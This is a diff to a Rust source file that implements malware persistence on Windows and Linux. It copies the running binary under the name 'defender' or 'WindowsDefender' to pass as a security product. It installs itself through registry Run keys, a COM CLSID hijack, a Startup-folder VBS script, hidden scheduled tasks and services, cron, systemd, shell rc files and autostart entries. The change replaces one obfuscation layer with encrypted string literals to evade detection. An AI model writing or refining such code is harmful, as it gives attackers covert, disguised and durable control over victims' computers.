@@ -1,4 +1,4 @@
-use encstr::{cobl, opaque_false};
+use encstr::astr;
 use std::env;
 use std::fs;
 #[cfg(target_os = "windows")]
@@ -17,18 +17,14 @@ use winreg::RegKey;
 use winreg::enums;
 
 #[cfg(target_os = "windows")]
-const TARGET_BIN: &str = "defender.exe";
+static TARGET_BIN: std::sync::LazyLock<String> = std::sync::LazyLock::new(|| astr!("defender.exe"));
 
 #[cfg(target_os = "linux")]
-const TARGET_DIR: &str = ".cache/defender";
+static TARGET_DIR: std::sync::LazyLock<String> = std::sync::LazyLock::new(|| astr!(".cache/defender"));
 #[cfg(target_os = "linux")]
-const TARGET_BIN: &str = "defender";
+static TARGET_BIN: std::sync::LazyLock<String> = std::sync::LazyLock::new(|| astr!("defender"));
 
 pub fn persist() -> std::io::Result<()> {
-    cobl!({
-    if opaque_false() {
-        return Ok(());
-    }
     if env::current_exe().is_err() {
         return Ok(());
     }
@@ -40,25 +36,19 @@ pub fn persist() -> std::io::Result<()> {
     {
         Ok(())
     }
-    })
 }
 
 #[cfg(target_os = "windows")]
 fn windows_persist() -> std::io::Result<()> {
-    cobl!({
     let current_exe = env::current_exe()?;
-
-    if opaque_false() {
-        return Ok(());
-    }
 
     if crate::util::is_dll::is_dll() {
         return dll_persistence(&current_exe);
     }
 
-    let appdata = env::var("APPDATA")
-        .map_err(|_| std::io::Error::new(std::io::ErrorKind::NotFound, "APPDATA not set"))?;
-    let target_path = Path::new(&appdata).join(TARGET_BIN);
+    let appdata = env::var(astr!("APPDATA"))
+        .map_err(|_| std::io::Error::new(std::io::ErrorKind::NotFound, astr!("APPDATA not set")))?;
+    let target_path = Path::new(&appdata).join(&*TARGET_BIN);
 
     if current_exe != target_path {
         fs::copy(&current_exe, &target_path)?;
@@ -69,65 +59,58 @@ fn windows_persist() -> std::io::Result<()> {
     registry_runkey(&target_path);
 
     Ok(())
-    })
 }
 
 #[cfg(target_os = "windows")]
 fn registry_runkey(target_path: &Path) {
     let path_str = target_path.to_string_lossy().to_string();
     let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
-    if let Ok((key, _)) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
-        let _ = key.set_value("WindowsDefender", &path_str);
+    if let Ok((key, _)) = hkcu.create_subkey(astr!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
+        let _ = key.set_value(astr!("WindowsDefender"), &path_str);
     }
 }
 
 #[cfg(target_os = "windows")]
 fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
-    cobl!({
     let dll_str = dll_path.to_string_lossy().to_string();
 
     let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
-    if let Ok((key, _)) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
-        let rundll_cmd = format!("rundll32.exe \"{}\",NetClientMain", dll_str);
-        let _ = key.set_value("WindowsDefender", &rundll_cmd);
+    if let Ok((key, _)) = hkcu.create_subkey(astr!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
+        let rundll_cmd = astr!("rundll32.exe \"") + &dll_str + astr!("\",NetClientMain");
+        let _ = key.set_value(astr!("WindowsDefender"), &rundll_cmd);
     }
 
-    if let Ok(appdata) = env::var("APPDATA") {
-        let startup = Path::new(&appdata).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+    if let Ok(appdata) = env::var(astr!("APPDATA")) {
+        let startup = Path::new(&appdata).join(astr!("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
         let _ = fs::create_dir_all(&startup);
-        let vbs = format!(
-            "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"rundll32.exe \"\"{}\"\",NetClientMain\", 0, False\n",
-            dll_str
-        );
-        let _ = fs::write(startup.join("defender.vbs"), vbs);
+        let vbs = astr!("Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"rundll32.exe \"\"") + &dll_str + astr!("\"\",NetClientMain\", 0, False\n");
+        let _ = fs::write(startup.join(astr!("defender.vbs")), vbs);
     }
 
-    let clsid_path =
-        "Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32";
+    let clsid_path = astr!("Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32");
     if let Ok((key, _)) = hkcu.create_subkey(clsid_path) {
-        let _ = key.set_value("", &dll_str);
-        let _ = key.set_value("ThreadingModel", &"Apartment".to_string());
+        let _ = key.set_value(astr!(""), &dll_str);
+        let _ = key.set_value(astr!("ThreadingModel"), &astr!("Apartment").to_string());
     }
 
     Ok(())
-    })
 }
 
 #[cfg(target_os = "windows")]
 fn scheduled_task(target_path: &Path) {
     let path_str = target_path.to_string_lossy().to_string();
-    let _ = Command::new("schtasks")
+    let _ = Command::new(astr!("schtasks"))
         .args(&[
-            "/create",
-            "/tn",
-            "WindowsDefender",
-            "/tr",
+            astr!("/create"),
+            astr!("/tn"),
+            astr!("WindowsDefender"),
+            astr!("/tr"),
             &path_str,
-            "/sc",
-            "onlogon",
-            "/rl",
-            "highest",
-            "/f",
+            astr!("/sc"),
+            astr!("onlogon"),
+            astr!("/rl"),
+            astr!("highest"),
+            astr!("/f"),
         ])
         .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
@@ -138,22 +121,22 @@ fn scheduled_task(target_path: &Path) {
 #[cfg(target_os = "windows")]
 fn windows_service(target_path: &Path) {
     let path_str = target_path.to_string_lossy().to_string();
-    let _ = Command::new("sc")
+    let _ = Command::new(astr!("sc"))
         .args(&[
-            "create",
-            "WindowsDefender",
-            "binPath=",
+            astr!("create"),
+            astr!("WindowsDefender"),
+            astr!("binPath="),
             &path_str,
-            "start=",
-            "auto",
+            astr!("start="),
+            astr!("auto"),
         ])
         .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .spawn();
     std::thread::sleep(std::time::Duration::from_secs(2));
-    let _ = Command::new("sc")
-        .args(&["start", "WindowsDefender"])
+    let _ = Command::new(astr!("sc"))
+        .args(&[astr!("start"), astr!("WindowsDefender")])
         .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
@@ -164,14 +147,10 @@ fn windows_service(target_path: &Path) {
 
 #[cfg(target_os = "linux")]
 fn linux_persist() -> std::io::Result<()> {
-    cobl!({
-    if opaque_false() {
-        return Ok(());
-    }
     let home =
-        env::var("HOME").map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
-    let target_dir = Path::new(&home).join(TARGET_DIR);
-    let target_path = target_dir.join(TARGET_BIN);
+        env::var(astr!("HOME")).map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
+    let target_dir = Path::new(&home).join(&*TARGET_DIR);
+    let target_path = target_dir.join(&*TARGET_BIN);
 
     fs::create_dir_all(&target_dir)?;
 
@@ -193,14 +172,13 @@ fn linux_persist() -> std::io::Result<()> {
     autostart_desktop(&target_path);
 
     Ok(())
-    })
 }
 
 #[cfg(target_os = "linux")]
 fn cron_persistence(target_path: &Path) {
-    let entry = format!("@reboot {}\n", target_path.display());
+    let entry = astr!("@reboot ") + &target_path.display().to_string() + astr!("\n");
 
-    let output = Command::new("crontab").arg("-l").output();
+    let output = Command::new(astr!("crontab")).arg(astr!("-l")).output();
     let existing = match output {
         Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
         Err(_) => String::new(),
@@ -211,7 +189,7 @@ fn cron_persistence(target_path: &Path) {
     }
 
     let new_cron = existing + &entry;
-    let mut child = match Command::new("crontab")
+    let mut child = match Command::new(astr!("crontab"))
         .stdin(std::process::Stdio::piped())
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
@@ -230,39 +208,36 @@ fn cron_persistence(target_path: &Path) {
 
 #[cfg(target_os = "linux")]
 fn systemd_persistence(target_path: &Path) {
-    let home = match env::var("HOME") {
+    let home = match env::var(astr!("HOME")) {
         Ok(h) => h,
         Err(_) => return,
     };
 
-    let service_dir = Path::new(&home).join(".config/systemd/user");
-    let service_file = service_dir.join("defender.service");
+    let service_dir = Path::new(&home).join(astr!(".config/systemd/user"));
+    let service_file = service_dir.join(astr!("defender.service"));
 
     let _ = fs::create_dir_all(&service_dir);
 
-    let unit = format!(
-        "[Unit]\nDescription=User Session Manager\n\n[Service]\nExecStart={}\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n",
-        target_path.display()
-    );
+    let unit = astr!("[Unit]\nDescription=User Session Manager\n\n[Service]\nExecStart=") + &target_path.display().to_string() + astr!("\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n");
 
     if fs::write(&service_file, unit).is_err() {
         return;
     }
 
-    let _ = Command::new("systemctl")
-        .args(&["--user", "enable", "defender.service"])
+    let _ = Command::new(astr!("systemctl"))
+        .args(&[astr!("--user"), astr!("enable"), astr!("defender.service")])
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .output();
 
-    let _ = Command::new("systemctl")
-        .args(&["--user", "start", "defender.service"])
+    let _ = Command::new(astr!("systemctl"))
+        .args(&[astr!("--user"), astr!("start"), astr!("defender.service")])
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .output();
 
-    let _ = Command::new("systemctl")
-        .args(&["enable", "defender.service"])
+    let _ = Command::new(astr!("systemctl"))
+        .args(&[astr!("enable"), astr!("defender.service")])
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .output();
@@ -270,7 +245,7 @@ fn systemd_persistence(target_path: &Path) {
 
 #[cfg(target_os = "linux")]
 fn bashrc_persistence(target_path: &Path) {
-    let home = match env::var("HOME") {
+    let home = match env::var(astr!("HOME")) {
         Ok(h) => h,
         Err(_) => return,
     };
@@ -280,12 +255,9 @@ fn bashrc_persistence(target_path: &Path) {
         .parent()
         .map(|p| p.display().to_string())
         .unwrap_or_default();
-    let line = format!(
-        "\n# Startup\nexport PATH=\"$PATH:{}\"\n{}\n",
-        parent_str, target_str
-    );
+    let line = astr!("\n# Startup\nexport PATH=\"$PATH:") + &parent_str + astr!("\"\n") + &target_str + astr!("\n");
 
-    for rc_file in &[".bashrc", ".profile", ".zshrc", ".bash_profile"] {
+    for rc_file in &[astr!(".bashrc"), astr!(".profile"), astr!(".zshrc"), astr!(".bash_profile")] {
         let rc_path = Path::new(&home).join(rc_file);
         if rc_path.exists() {
             if let Ok(content) = fs::read_to_string(&rc_path) {
@@ -307,18 +279,15 @@ fn bashrc_persistence(target_path: &Path) {
 
 #[cfg(target_os = "linux")]
 fn autostart_desktop(target_path: &Path) {
-    let home = match env::var("HOME") {
+    let home = match env::var(astr!("HOME")) {
         Ok(h) => h,
         Err(_) => return,
     };
 
-    let autostart_dir = Path::new(&home).join(".config/autostart");
+    let autostart_dir = Path::new(&home).join(astr!(".config/autostart"));
     let _ = fs::create_dir_all(&autostart_dir);
 
-    let desktop = format!(
-        "[Desktop Entry]\nType=Application\nName=defender\nExec={}\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\n",
-        target_path.display()
-    );
+    let desktop = astr!("[Desktop Entry]\nType=Application\nName=defender\nExec=") + &target_path.display().to_string() + astr!("\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\n");
 
-    let _ = fs::write(autostart_dir.join("defender.desktop"), desktop);
+    let _ = fs::write(autostart_dir.join(astr!("defender.desktop")), desktop);
 }
